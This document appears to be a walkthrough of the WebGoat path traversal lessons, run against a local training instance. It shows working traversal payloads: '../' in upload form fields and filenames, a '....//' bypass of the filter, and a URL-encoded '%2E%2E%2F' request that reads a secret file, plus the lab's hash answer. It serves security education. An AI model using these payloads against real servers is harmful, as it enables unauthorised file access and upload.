# (A1) Path traversal

## Lesson 2 - Path traversal while uploading files
Upload the profile picture outside of the `{username}` folder:
```
-----------------------------27260332916296986533744447080
Content-Disposition: form-data; name="fullName"

../test

```

## Lesson 3 - Path traversal while uploading files
The same as the previous lesson but this time the `fullName` is sanitized.
However, the fix is not perfect: `fullName.replace("../", "")`.
```
-----------------------------22445278214949939952398157170
Content-Disposition: form-data; name="fullNameFix"

....//test
```

## Lesson 4 - Path traversal while uploading files
This time we must modify the original filename:
```
-----------------------------1740053938349190302459631647
Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../myfile.txt"
Content-Type: text/plain

```

## Lesson 5 - Retrieving other files with a path traversal
Clicking on _Random picture_ sends this request:
```
GET http://vernjan:8080/WebGoat/PathTraversal/random-picture
...

---
HTTP/1.1 200 OK
Connection: keep-alive
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Location: /PathTraversal/random-picture?id=4.jpg
X-Frame-Options: DENY
Content-Type: image/jpeg
Content-Length: 58880
Date: Fri, 03 Apr 2020 07:03:20 GMT
```

Notice the `Location` header. Lets's try to call it:
```
GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=4.jpg
...

---
C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\1.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\10.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\2.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\3.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\4.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\5.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\6.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\7.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\8.jpg,C:\Users\Jan\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\9.jpg
```
We get directory listing back. So let's try to fix the id (i.e. remove the `.jpg` extension):
```
GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=4
...

---
HTTP/1.1 200 OK
Connection: keep-alive
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Location: /PathTraversal/random-picture?id=4.jpg
X-Frame-Options: DENY
Content-Type: image/jpeg
Content-Length: 58880
Date: Fri, 03 Apr 2020 07:11:12 GMT

/9j/4AAQSkZJRgABAQEASABIAAD ..
```

We got the image back (base64 encoded).

Now try getting `path-traversal-secret.jpg` (located right under `c:\Users\{user}\.webgoat-v8.0.0-SNAPSHOT\`):
```
GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=../../path-traversal-secret
...

---
Illegal characters are not allowed in the query params
```

Ok, let's try escaping:
```
GET http://vernjan:8080/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret
...

---
You found it submit the SHA-512 hash of your username as answer
```

The last step:
```
$ printf vernjan | sha512sum
4c5aab6d6999943bac2b9e7acca349c0c7fce12761a4798062031a0f40a08a3f4011f3b09915f868fe7966c401316951b7669f5d54d3c67774e3a63c3040c9a6  -
```
